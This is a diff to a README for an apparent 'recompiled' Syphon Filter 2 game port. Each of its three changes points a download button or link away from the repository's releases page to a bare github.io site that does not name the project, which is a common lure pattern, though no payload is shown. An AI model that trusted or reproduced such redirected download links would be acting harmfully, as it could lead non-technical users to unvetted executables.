@@ -1,6 +1,6 @@
 # 🎮 syphon-filter-2-recompiled - Play Syphon Filter 2 on Modern Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Syphon_Filter_2_Recompiled-blue?style=for-the-badge&logo=github)](https://github.com/asser4775-cyber/syphon-filter-2-recompiled/releases)
+[![Download Now](https://img.shields.io/badge/Download-Syphon_Filter_2_Recompiled-blue?style=for-the-badge&logo=github)](https://asser4775-cyber.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Follow these simple steps to get the game running. No technical skills required.
 
 Visit this link to download the application:
 
-👉 **[Download Syphon Filter 2 Recompiled](https://github.com/asser4775-cyber/syphon-filter-2-recompiled/releases)**
+👉 **[Download Syphon Filter 2 Recompiled](https://asser4775-cyber.github.io)**
 
 On that page, you’ll see a list of files. Look for the one that matches your system (usually labeled with "Windows" or "win64"). Click it to start the download.
 
@@ -129,7 +129,7 @@ This project is **not affiliated with** or endorsed by Sony Interactive Entertai
 
 Ready to jump back into the world of Gabe Logan?
 
-[![Get the Game](https://img.shields.io/badge/⬇️_Download-Now-green?style=for-the-badge)](https://github.com/asser4775-cyber/syphon-filter-2-recompiled/releases)
+[![Get the Game](https://img.shields.io/badge/⬇️_Download-Now-green?style=for-the-badge)](https://asser4775-cyber.github.io)
 
 ---
 
